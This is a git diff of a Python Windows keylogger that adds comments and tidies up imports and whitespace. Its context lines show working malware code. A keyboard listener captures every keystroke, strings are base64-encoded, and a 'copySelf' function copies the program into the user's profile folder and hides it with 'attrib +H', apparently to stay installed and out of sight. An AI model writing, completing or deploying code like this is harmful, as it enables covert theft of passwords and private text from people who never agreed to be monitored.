@@ -6,9 +6,7 @@ import win32clipboard
 import ifaddr
 import sys
 import subprocess
-import shutil
 from distutils import dir_util
-
 
 # Own files
 import numchecks
@@ -25,6 +23,7 @@ logfilePath = 'log.txt'
 buf = ''
 numCount = 0
 
+# Base64 encode the string
 def encodeStr(str):
     return base64.b64encode(str.encode('ascii')).decode('ascii')
 
@@ -114,12 +113,13 @@ def keylog():
     with keyboard.Listener(on_press=press) as listener:
         listener.join()
 
+# Copy itself to the user's home folder
 def copySelf():
     try:
         if (os.getcwd() != os.environ['USERPROFILE'] + r'\keylogger'):
             cpPath = os.environ['USERPROFILE'] + r'\keylogger'
             dir_util.copy_tree(os.getcwd(), cpPath)
-            subprocess.run(['attrib', '+H', cpPath], text=True, shell=True)  
+            subprocess.run(['attrib', '+H', cpPath], text=True, shell=True)
             return 0
         else:
             return 1
